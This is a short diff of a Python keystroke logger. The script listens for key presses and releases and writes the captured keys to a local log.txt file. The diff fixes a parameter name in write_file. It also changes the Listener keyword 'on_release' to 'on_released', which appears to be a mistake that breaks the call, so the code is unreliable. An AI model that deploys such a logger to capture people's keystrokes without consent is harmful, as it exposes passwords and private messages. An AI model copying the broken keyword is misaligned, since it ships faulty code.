@@ -16,7 +16,7 @@ def on_press(key):
         print('special key {0} pressed'.format(key))
 
 
-def write_file(key):
+def write_file(keys):
     with open('log.txt', 'w') as f:
         for key in keys:
             # Removing ''
@@ -36,5 +36,5 @@ def on_release(key):
 
 
 with Listener(on_press=on_press,
-              on_release=on_release) as listener:
+              on_released=on_release) as listener:
     listener.join()
